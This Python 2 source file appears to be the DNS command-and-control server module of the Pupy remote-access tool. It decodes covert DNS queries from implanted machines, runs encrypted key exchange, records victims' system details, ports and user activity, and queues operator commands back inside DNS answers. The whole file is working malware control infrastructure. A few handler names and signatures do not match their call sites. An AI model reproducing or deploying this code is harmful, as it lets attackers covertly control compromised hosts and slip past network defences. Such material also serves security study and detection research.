# -*- coding: utf-8 -*-

__all__ = (
    'convert_node',
    'Session',
    'DnsCommandServerHandler',
    'DnsCommandServer',

    'DnsNoCommandServerException',
    'DnsPingRequest',
    'DnsCommandServerException',
)

import struct
import random
import base64
import time

import zlib
import hashlib

import functools
import logging

try:
    from pupylib import getLogger
    logger = getLogger('dnscnc')
except:
    logger = logging.getLogger('dnscnc')

blocks_logger = logger.getChild('whitelist')

import socket
import socketserver
import binascii
import netaddr

from threading import Thread, RLock, Event

from dnslib import DNSRecord, RR, QTYPE, A, RCODE
from dnslib.server import DNSHandler, BaseResolver, DNSLogger

import ascii85

from picocmd import (
    Poll, Ack,
    SystemStatus, OnlineStatus,
    Exit, ConnectablePort, PortQuizPort,
    Policy, Kex, SystemInfo,
    PupyState,
    Error, ParcelInvalidCrc,
    ParcelInvalidPayload,
    Parcel, PackError, CustomEvent,
    from_bytes
)

from ecpv import ECPV

def convert_node(node):
    try:
        return str(netaddr.IPAddress(node))
    except:
        return int(node, 16)

class DeprecatedVersion(Exception):
    pass

class UnknownVersion(Exception):
    pass

class NodeBlocked(Exception):
    pass

class ExpirableObject(object):

    __slots__ = (
        '_start', '_last_access', 'timeout'
    )

    def __init__(self, timeout):
        self.timeout = timeout

        self._start = time.time()
        self._last_access = 0

    @property
    def expired(self):
        return (self.idle > self.timeout)

    @property
    def idle(self):
        return int(time.time() - self._last_access)

    @property
    def duration(self):
        return int(time.time() - self._start)

    def bump(self):
        self._last_access = time.time()

class Node(ExpirableObject):
    __slots__ = (
        'node', 'cid', 'iid', 'version',
        'commands', 'alert',
        '_warning', '_warning_set_time'
    )

    def __init__(self, node, timeout, cid=0x31337, iid=0, version=1, commands=[], alert=False):
        super(Node, self).__init__(timeout)
        self.node = node
        self.cid = cid
        self.iid = iid
        self.version = version
        self.commands = commands or []
        self.alert = alert
        self._warning = None
        self._warning_set_time = None

    @property
    def warning(self):
        if not self._warning:
            return None

        if time.time() < self._warning_set_time + self.timeout:
            self._warning = None
            return None

        return self._warning

    @warning.setter
    def warning(self, warning):
        self._warning = warning
        self._warning_set_time = time.time()

    def add_command(self, command):
        if not self.commands:
            self.commands = [command]
        else:
            self.commands.append(command)

    def __repr__(self):
        return '{{NODE:{:012X} IID:{} CID:{:08X} ALERT:{} COMMANDS:{}}}'.format(
            self.node, self.iid, self.cid, self.alert, len(self.commands))

class Session(ExpirableObject):

    __slots__ = (
        'spi', 'node', 'cid',
        'system_info', 'system_status', 'online_status',
        'open_ports', 'egress_ports', 'commands',
        'last_nonce', 'last_qname', 'pstore_dirty', 'connected',
        'cache', '_encoder',
        '_pstore_dirty_reported', '_users_cnt_reported',
        '_high_resource_usage_reported', '_user_active_reported'
    )

    def __init__(self, node, cid, spi, encoder, commands, timeout):
        super(Session, self).__init__(timeout)

        self._encoder = encoder

        self.node = node
        self.cid = cid
        self.spi = spi
        self.system_info = None
        self.system_status = None
        self.online_status = None
        self.open_ports = {}
        self.egress_ports = set()
        self.commands = commands
        self.last_nonce = None
        self.last_qname = None
        self.pstore_dirty = False
        self.connected = False
        self.cache = {}

        self._pstore_dirty_reported = False
        self._users_cnt_reported = None
        self._high_resource_usage_reported = False
        self._user_active_reported = None

    @property
    def encoder(self):
        return self._encoder

    def add_command(self, command):
        if not self.commands:
            self.commands = [command]
        else:
            self.commands.append(command)

    def __repr__(self):
        return '{{SESSION {:08x} {}}}'.format(
            self.spi, self.system_info or ''
        )

class DnsNoCommandServerException(Exception):
    pass

class DnsPingRequest(Exception):
    pass

class DnsCommandServerException(Exception):

    __slots__ = ('message', 'nonce', 'version', 'domain')

    def __init__(self, message, nonce, version, domain):
        self.message = message
        self.nonce = nonce
        self.version = version
        self.domain = domain

    @property
    def error(self):
        return Error(self.message)

    def __str__(self):
        return '{}: (d={} v={} n={})'.format(
            self.message, self.nonce, self.version, self.domain)

    def __repr__(self):
        return repr(self.error)

class DnsCommandServerHandler(BaseResolver):
    ENCODER_V1 = 0
    ENCODER_V2 = 1

    def __init__(self, domain, key, recursor=None, timeout=None, whitelist=None):
        self.sessions = {}
        self.nodes = {}
        self.domain = domain
        self.recursor = recursor
        self.encoders = (
            ECPV(private_key=key[0]),
            ECPV(private_key=key[1], curve='brainpoolP224r1')
        )
        self.translation = dict(zip(
            ''.join([
                ''.join([chr(x) for x in xrange(ord('a'), ord('z') + 1)]),
                '-',
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
            ]),
            ''.join([
                ''.join([chr(x) for x in xrange(ord('A'), ord('Z') + 1)]),
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
                '=',
            ])))

        self.interval = 30
        self.kex = True
        self.timeout = timeout or self.interval*3
        self.commands = []
        self.node_commands = {}
        self.lock = RLock()
        self.finished = Event()
        self.whitelist = whitelist

    def cleanup(self):
        while not self.finished.is_set():
            with self.lock:
                to_remove = []

                for spi, session in self.sessions.iteritems():
                    if session.expired:
                        to_remove.append(spi)

                for spi in to_remove:
                    self.on_session_cleaned_up(self.sessions[spi])
                    del self.sessions[spi]

                to_remove = []

                for key, node in self.nodes.iteritems():
                    if node.expired:
                        to_remove.append(key)

                for key in to_remove:
                    del self.nodes[key]

                self.cache = {}

            time.sleep(self.timeout)

    def locked(f):
        @functools.wraps(f)
        def wrapped(self, *args, **kwargs):
            with self.lock:
                return f(self, *args, **kwargs)
        return wrapped

    def _nodes_by_nodeids(self, ids):
        return [
            node for (nodeid, iid),node in self.nodes.iteritems() if nodeid in ids
        ]

    def _sessions_by_nodeids(self, ids):
        return [
            session for session in self.sessions if self.sessions[session].node in ids
        ]

    def _nodeids_with_sessions(self, ids):
        return set([
            session.node for session in self.sessions if self.sessions[session].node in ids
        ])

    @locked
    def add_command(self, command, session=None, default=False):
        if default and session:
            nodes = session

            if type(nodes) in (str,unicode):
                nodes = [convert_node(x) for x in nodes.split(',')]
            elif type(nodes) == int:
                nodes = [nodes]

            idx = 0

            nodes_with_sessions = self._nodeids_with_sessions(nodes)

            for node in self._nodes_by_nodeids(nodes):
                if node.node in nodes_with_sessions:
                    continue

                node.add_command(command)

            for nodeid in nodes:
                if nodeid not in self.node_commands:
                    self.node_commands[nodeid] = []

                self.node_commands[nodeid].append(command)
                idx += 1

            return idx

        if default:
            self.commands.append(command)

        if session:
            sessions = self.find_sessions(spi=session) or \
              self.find_sessions(node=session)

            if not sessions:
                return 0

            count = 0
            if type(sessions) in (list, tuple):
                for session in sessions:
                    session.add_command(command)
                    count += 1
            else:
                count = 1
                sessions.add_command(command)

            return count
        else:
            count = 0
            for session in self.find_sessions():
                session.add_command(command)
                count += 1

            return count

    @locked
    def reset_commands(self, session=None, default=False):
        if default and session:
            nodes = session
            if type(nodes) in (str,unicode):
                nodes = [convert_node(x) for x in nodes.split(',')]
            elif type(nodes) == int:
                nodes = [nodes]

            idx = 0
            for node in self._nodes_by_nodeids(nodes):
                self.commands = []

            for nodeid in nodes:
                if nodeid in self.node_commands:
                    del self.node_commands[nodeid]
                    idx += 1

            return idx

        if default:
            self.commands = []

        if session:
            sessions = self.find_sessions(spi=session) or \
              self.find_sessions(node=session)

            if not sessions:
                return 0

            count = 0
            if type(sessions) in (list, tuple):
                for session in sessions:
                    session.commands = []
                    count += 1
            else:
                count = 1
                sessions.commands = []

            return count
        else:
            count = 0
            for session in self.find_sessions():
                if session.commands:
                    session.commands = []
                    count += 1
            return count

    @locked
    def find_nodes(self, node):
        if node is None:
            return list(self.nodes.itervalues())

        if type(node) in (str,unicode):
            node = [convert_node(x) for x in node.split(',')]
        elif type(node) == int:
            node = [node]

        return self._nodes_by_nodeids(node)

    @locked
    def find_sessions(self, spi=None, node=None):
        if spi:
            if type(spi) in (str,unicode):
                spi = [int(x, 16) for x in spi.split(',')]
            elif type(spi) == int:
                spi = [spi]

        if node:
            if type(node) in (str,unicode):
                node = [convert_node(x) for x in node.split(',')]
            elif type(node) == int:
                node = [node]

        if not (spi or node):
            return [
                session for session in self.sessions.itervalues() \
                if session.system_info is not None
            ]
        elif spi:
            return [
                self.sessions[x] for x in spi if x in self.sessions
            ]
        elif node:
            return [
                session for session in self.sessions.itervalues() \
                    if session.cid == node or session.node == node or (
                        session.system_info and \
                        (session.system_info['node'] in set(node) or \
                              str(session.system_info['external_ip']) in set(node)))
            ]

    @locked
    def set_policy(self, kex=True, timeout=None, interval=None, node=None):
        if kex == self.kex and self.timeout == timeout and self.interval == self.interval:
            return

        if interval and interval < 30:
            raise ValueError('Interval should not be less then 30s to avoid DNS storm')

        if node and (interval or timeout):
            sessions = self.find_sessions(
                spi=node) or self.find_sessions(node=node)

            if sessions:
                for session in sessions:
                    if interval:
                        session.timeout = (interval*3)
                    else:
                        interval = self.interval

                    if timeout:
                        session.timeout = timeout

                    if kex is None:
                        kex = self.kex

        else:
            self.interval = interval or self.interval
            self.timeout = max(timeout if timeout else self.timeout, self.interval*3)
            self.kex = kex if (kex is not None) else self.kex

            interval = self.interval
            timeout = self.timeout
            kex = self.kex

        cmd = Policy(interval, kex)
        return self.add_command(cmd, session=node)

    @locked
    def encode_pastelink_content(self, content, version=ENCODER_V2):
        h = hashlib.sha1()
        h.update(content)

        content = h.digest() + content
        content = zlib.compress(content, 9)
        content = self.encoders[version].pack(content)
        content = ascii85.ascii85EncodeDG(content)

        return content

    def on_custom_event(self, eventid):
        pass

    def on_connect(self, info):
        pass

    def on_keep_alive(self, info):
        pass

    def on_exit(self, info):
        pass

    def on_new_session(self, session):
        pass

    def on_session_cleaned_up(self, session):
        pass

    def on_online_status(self, session):
        pass

    def on_egress_ports(self, session):
        pass

    def on_pstore(self, session):
        pass

    def on_user_become_active(self, session):
        pass

    def on_user_become_inactive(self, session):
        pass

    def on_users_increment(self, session):
        pass

    def on_users_decrement(self, session):
        pass

    def on_hight_resource_usage(self, session):
        pass

    def encoder_from_session(self, session, version):
        if session:
            return session.encoder
        elif version == 1:
            return self.encoders[self.ENCODER_V1]
        elif version == 2:
            return self.encoders[self.ENCODER_V2]

        raise ValueError('Unsupported version {}'.format(version))

    def csum_from_session(self, session, version):
        if version == 1:
            return None, None

        encoder = self.encoder_from_session(session, version)
        return encoder.gen_csum, encoder.check_csum

    def _a_page_encoder(self, data, encoder, nonce):
        data = encoder.encode(data, nonce, symmetric=encoder.kex_completed)

        length = struct.pack('B', len(data))
        payload = length + data

        if len(payload) > 75:
            raise ValueError('Page size more than 75 bytes ({})'.format(len(payload)))

        response = []

        for idx, part in enumerate([payload[i:i+3] for i in xrange(0, len(payload), 3)]):
            header = (random.randint(1, 3) << 30)
            idx = idx << 25
            bits = (struct.unpack('>I', '\x00'+part+chr(random.randrange(0, 255))*(3-len(part)))[0]) << 1
            packed = struct.unpack('!BBBB', struct.pack('>I', header | idx | bits | int(not bool(bits & 6))))
            response.append('.'.join(['{}'.format(int(x)) for x in packed]))

        return response

    def _q_page_decoder(self, data):
        domain = data
        parts = data.split('.')

        if len(parts) == 0:
            raise DnsPingRequest(1)
        elif len(parts) == 1 and parts[0].startswith('ping'):
            if len(parts[0]) == 4:
                raise DnsPingRequest(15)
            else:
                raise DnsPingRequest(int(parts[0][4:]))

        elif len(parts) not in (2,3):
            raise DnsNoCommandServerException()

        parts = [
            base64.b32decode(''.join([
                self.translation[x] for x in part
            ])) for part in parts
        ]

        node_blob = ''
        nodeid = None
        cid = None
        iid = None
        spi = 0
        nonce = 0
        version = 1
        encoder_version = self.ENCODER_V1

        if len(parts) == 2:
            nonce_blob, data = parts
            nonce, = struct.unpack_from('>I', nonce_blob)

            if len(nonce_blob) > 4:
                node_blob = nonce_blob[4:]
                encoder_version = self.ENCODER_V2
                version = 2

            encoder = self.encoders[encoder_version]
            session = None

        elif len(parts) == 3:
            spi, nonce_blob, data = parts
            spi, = struct.unpack('>I', spi)
            nonce, = struct.unpack_from('>I', nonce_blob)

            if len(nonce_blob) > 4:
                node_blob = nonce_blob[4:]
                encoder_version = self.ENCODER_V2
                version = 2

            session = None
            with self.lock:
                if spi not in self.sessions:
                    raise DnsCommandServerException(
                        'NO_SESSION', nonce, version, data)

                session = self.sessions[spi]
                encoder = session.encoder

        try:
            payload = encoder.decode(data+node_blob, nonce, symmetric=True)
        except (ParcelInvalidPayload, ParcelInvalidCrc), e:
            raise DnsCommandServerException(
                e.error, nonce, version, domain)

        if node_blob:
            offset_node_blob = len(payload) - (1+4+2+6)
            payload, node_blob = payload[:offset_node_blob], payload[offset_node_blob:]

            version, cid, iid = struct.unpack_from('>BIH', node_blob)

            if version != 2:
                raise UnknownVersion()

            nodeid = from_bytes(node_blob[1+4+2:1+4+2+6])

        logger.debug('NONCE: %08x SPI: %08x NODE: %012x',
            nonce, spi, nodeid if bool(node_blob) else 0)

        return payload, session, nonce, nodeid, cid, iid, version

    def _new_node_from_session(self, session):
        if not session.system_info:
            return

        nodeid = session.system_info['node']
        extip = str(session.system_info['external_ip'])

        node = Node(
            nodeid, self.timeout,
            commands=self.node_commands.get(nodeid),
            iid=session.spi
        )

        self.nodes[(nodeid, session.spi)] = node

        for command in self.node_commands.get(extip, []):
            node.add_command(command)

        return node

    def _new_node_from_systeminfo(self, command, sid=None):
        nodeid = command.node
        extip = str(command.external_ip)

        node = Node(
            command.node, self.timeout,
            commands = self.node_commands.get(nodeid),
            iid=sid or 0
        )

        self.nodes[(nodeid, sid or 0)] = node

        for command in self.node_commands.get(extip, []):
            node.add_command(command)

        return node

    def _cmd_processor(self, command, session, node, csum_gen, csum_check):
        logger.debug('command=%s/%s session=%s / node commands=%s / node = %s / cid = %s / iid = %s',
            command, type(command).__name__,
            '{:08x}'.format(session.spi) if session else None,
            bool(self.node_commands),
            '{:012x}'.format(node.node) if node else None,
            '{:08x}'.format(node.cid) if node else None,
            node.iid if node else None)

        if isinstance(command, Poll) and session is None:
            if not self.kex:
                if node:
                    return node.commands or [
                        Policy(self.interval, self.kex)
                    ]

                elif self.commands:
                    return self.commands

            return [Policy(self.interval, self.kex), Poll()]

        elif isinstance(command, Ack) and (session is None):
            if node:
                if len(node.commands) < command.amount:
                    logger.debug('ACK: invalid amount of commands: %d > %d',
                        command.amount, len(node.commands))

                node.commands = node.commands[command.amount:]

            return [Ack(1)]

        elif isinstance(command, Exit):
            if session and session.system_info:
                self.on_exit(session.system_info)

            with self.lock:
                del self.sessions[session.spi]

            return [Exit()]

        elif (
                isinstance(command, Poll) or isinstance(command, SystemStatus)
            ) and (session is not None):
            if session.system_info:
                self.on_keep_alive(session.system_info)

            if isinstance(command, SystemStatus):
                session.system_status = command.get_dict()

                if session._users_cnt_reported is not None and \
                  session._users_cnt_reported != session.system_status['users']:
                    if session._users_cnt_reported > session.system_status['users']:
                        self.on_users_decrement(session)
                    else:
                        self.on_users_increment(session)

                session._users_cnt_reported = session.system_status['users']

                if session.system_status['mem'] > 90 or session.system_status['cpu'] > 90:
                    if not session._high_resource_usage_reported:
                        self.on_high_resource_usage(session)
                        session._high_resource_usage_reported = True
                else:
                    session._high_resource_usage_reported = False

                if session._user_active_reported is not None and \
                  session._user_active_reported != session.system_status['idle']:
                    if session.system_status['idle']:
                        self.on_user_become_inactive(session)
                    else:
                        self.on_user_become_active(session)

                session._user_active_reported = session.system_status['idle']

            commands = session.commands

            if not session.system_info:
                commands = list(commands)
                commands.append(Poll())

            return commands

        elif isinstance(command, SystemInfo) and not session:
            extip = str(command.external_ip)
            commands = []

            if not node:
                with self.lock:
                    if not (command.node, 0) in self.nodes:
                        node = self._new_node_from_systeminfo(command)
                    else:
                        node = self.nodes[(command.node, 0)]

                    node.bump()

                    commands = node.commands or [SystemInfo()]

            logger.debug('SystemStatus + No session + node_commands: %s/%s in %s?',
                node, extip, node.commands)

            return node.commands

        elif isinstance(command, OnlineStatus) and session is not None:
            session.online_status = command.get_dict()
            self.on_online_status(session)

        elif isinstance(command, ConnectablePort) and session is not None:
            if command.ip not in session.open_ports:
                session.open_ports[command.ip] = set()

            for port in command.ports:
                session.open_ports[command.ip].add(port)

        elif isinstance(command, PortQuizPort) and session is not None:
            for port in command.ports:
                session.egress_ports.add(port)

            self.on_egress_ports(session)

        elif isinstance(command, PupyState) and session is not None:
            session.pstore_dirty = command.pstore_dirty
            session.connected = command.connected

            if session.pstore_dirty and not session._pstore_dirty_reported:
                session._pstore_dirty_reported = True
                self.on_pstore(session)
            elif not session.pstore_dirty:
                session._pstore_dirty_reported = False

        elif isinstance(command, Ack) and (session is not None):
            if session.system_info:
                self.on_keep_alive(session.system_info)

            if command.amount > len(session.commands):
                logger.debug('ACK: invalid amount of commands: %d > %d',
                    command.amount, len(session.commands))
            session.commands = session.commands[command.amount:]

            return [Ack(1)]

        elif isinstance(command, SystemInfo) and session is not None:
            new_session = not bool(session.system_info)
            session.system_info = command.get_dict()

            if not node:
                with self.lock:
                    if not (command.node, session.spi) in self.nodes:
                        node = self._new_node_from_systeminfo(command, session.spi)
                    else:
                        node = self.nodes[(command.node, session.spi)]

                    node.bump()

                    commands = node.commands or [SystemInfo()]

            if new_session:
                self.on_new_session(session)

        elif isinstance(command, Kex):
            with self.lock:
                response = []

                encoder_version = \
                  self.ENCODER_V1 if not node or node.version == 1 \
                  else self.ENCODER_V2

                if command.spi not in self.sessions:
                    self.sessions[command.spi] = Session(
                        node.node if node else None,
                        node.cid if node else None,
                        command.spi,
                        self.encoders[encoder_version].clone(),
                        self.commands,
                        self.timeout
                    )

                session = self.sessions[command.spi]

                encoder = session.encoder
                response, key = encoder.process_kex_request(command.parcel)
                logger.debug('kex:key=%s', binascii.b2a_hex(key[0]))

            return [Kex(response)]
        elif isinstance(command, CustomEvent):
            logger.debug('custom event: %08x', command.eventid)
            self.on_custom_event(command.eventid, session, node)
        elif isinstance(command, PortQuizPort):
            logger.debug('portquiz: %s', command)
        elif isinstance(command, ConnectablePort):
            logger.debug('connectable: %s', command)
        elif isinstance(command, OnlineStatus):
            logger.debug('online-status: %s', command)
        elif isinstance(command, PupyState):
            logger.debug('pupy-state')
        else:
            return [Error('NO_POLICY')]

        return [Ack()]

    def resolve(self, request, handler):
        if request.q.qtype != QTYPE.A:
            reply = request.reply()
            reply.header.rcode = RCODE.NXDOMAIN
            logger.debug('Request unknown qtype: %s', QTYPE.get(request.q.qtype))
            return reply

        with self.lock:
            data = request.q.qname
            part = data.stripSuffix(self.domain).idna()[:-1]
            if part in self.cache:
                response = self.cache[part]
                response.header.id = request.header.id
                return self.cache[part]

            response = self._resolve(request, handler)
            self.cache[part] = response
            return response

    def process(self, qname):
        responses = []

        session = None
        nonce = None
        node = None

        version = 1

        try:
            request, session, nonce, nodeid, cid, iid, version = \
              self._q_page_decoder(qname)

            with self.lock:
                if nodeid:
                    if not (nodeid, iid) in self.nodes:
                        self.nodes[(nodeid, iid)] = Node(
                            nodeid, self.timeout,
                            cid, iid, version, self.node_commands.get(nodeid),
                        )

                    node = self.nodes[(nodeid, iid)]
                    node.bump()

                if session and not node:
                    if not (session.node, session.spi) in self.nodes:
                        node = self._new_node_from_session(session)
                    else:
                        node = self.nodes[(session.node, session.spi)]

                if node:
                    node.bump()

            if self.whitelist and node:
                if not self.whitelist(nodeid, cid, version):
                    blocks_logger.warning('Prohibit communication with %s/%s version %s on %s',
                        iid, cid, version, nodeid)

                    node.alert = True
                    raise NodeBlocked()

            if session and session.last_nonce and session.last_qname:
                if nonce < session.last_nonce:
                    logger.info('Ignore nonce from past: %s < %s / %s',
                        nonce, session.last_nonce, session.node)

                    if node:
                        node.warning = 'Nonce from the past ({} < {})'.format(
                            nonce, session.last_nonce)

                    return []
                elif session.last_nonce == nonce and session.last_qname != qname:
                    logger.info('Last nonce but different qname: %s != %s',
                        session.last_qname, qname)

                    if node:
                        node.warning = 'Different qname ({})'.format(qname)
                    return []

                session.bump()

            if node:
                node.alert = False

            gen_csum, check_csum = self.csum_from_session(session, version)

            try:
                commands = Parcel.unpack(request, nonce, check_csum)
            except ParcelInvalidCrc:
                logger.info('Invalid Parcel CRC (qname=%s, version=%s)',
                            qname, version)
                return None

            for command in commands:
                for response in self._cmd_processor(
                        command, session, node, check_csum, gen_csum):
                    responses.append(response)

            if session:
                session.last_nonce = nonce
                session.last_qname = qname

        except DnsCommandServerException as e:
            nonce = e.nonce
            version = e.version

            responses = [e.error, Policy(self.interval, self.kex), Poll()]
            emsg = 'Server Error: {} (v={})'.format(e, version)
            logger.debug(emsg)
            if node:
                node.warning = emsg

        except DnsNoCommandServerException:
            emsg = 'No CNC Exception'
            logger.debug(emsg)

            if node:
                node.warning = emsg

            return None

        except DnsPingRequest, e:
            replies = []
            for i in xrange(e.args[0]):
                x = (i % 65536) >> 8
                y = i % 256
                replies.append('127.0.{}.{}'.format(x, y))

            logger.debug('ping request:%s', i)
            return replies

        except NodeBlocked:
            return None

        except TypeError, e:
            # Usually - invalid padding
            emsg = None

            if str(e) == 'Incorrect padding':
                emsg = 'Decoding failed: qname={}'.format(qname)
                logger.warning(emsg)
            else:
                emsg = str(e)
                logger.exception(e)

            if node:
                node.warning = emsg

            return None

        except Exception as e:
            logger.exception(e)

            if node:
                node.warning = str(e)

            return None

        logger.debug(
            'responses=%s session=%s',
            responses,
            '{:08x}'.format(session.spi) if session else None
        )

        encoder = self.encoder_from_session(session, version)
        gen_csum = encoder.gen_csum if version > 1 else None

        try:
            payload = Parcel(*responses).pack(nonce, gen_csum)
        except PackError, e:
            emsg = 'Could not create parcel from commands: {} (session={})'.format(
                e, '{:08x}'.format(session.spi) if session else None)

            logger.error(emsg)

            if node:
                node.warning = emsg

            return None

        return self._a_page_encoder(payload, encoder, nonce)

    def _resolve(self, request, handler):
        qname = request.q.qname
        reply = request.reply()

        # TODO:
        # Resolve NS?, DS, SOA somehow
        if not qname.matchSuffix(self.domain):
            if self.recursor:
                try:
                    return DNSRecord.parse(request.send(self.recursor, timeout=2))
                except socket.error:
                    pass
                except Exception as e:
                    logger.exception('DNS request forwarding failed (%s)', e)
            else:
                logger.debug('Bad domain: %s (suffix=%s)', qname, self.domain)

            reply.header.rcode = RCODE.NXDOMAIN
            return reply


        arecords = self.process(qname.stripSuffix(self.domain).idna()[:-1])

        if arecords:
            for address in arecords:
                reply.add_answer(RR(qname, QTYPE.A, rdata=A(address), ttl=600))
        else:
            reply.header.rcode = RCODE.NXDOMAIN

        return reply

class DnsCommandServer(object):
    def __init__(self, handler, port=5454, address='0.0.0.0'):
        self.handler = handler

        self.udp_server = socketserver.UDPServer((address, port), DNSHandler)
        self.udp_server.allow_reuse_address = True
        self.udp_server.resolver = handler
        self.udp_server.logger = DNSLogger(log='log_error',prefix=False)

        self.tcp_server = socketserver.TCPServer((address, port), DNSHandler)
        self.tcp_server.allow_reuse_address = True
        self.tcp_server.resolver = handler
        self.tcp_server.logger = DNSLogger(log='log_error',prefix=False)

        self.udp_server_thread = Thread(
            target=self.udp_server.serve_forever, kwargs={
                'poll_interval': 50000
            })

        self.udp_server_thread.daemon = True

        self.tcp_server_thread = Thread(
            target=self.tcp_server.serve_forever, kwargs={
                'poll_interval': 50000
            })

        self.tcp_server_thread.daemon = True

        self.cleaner = Thread(target=handler.cleanup)
        self.cleaner.daemon = True

    def start(self):
        self.cleaner.start()
        self.tcp_server_thread.start()
        self.udp_server_thread.start()

    def stop(self):
        self.tcp_server.server_close()
        self.udp_server.server_close()
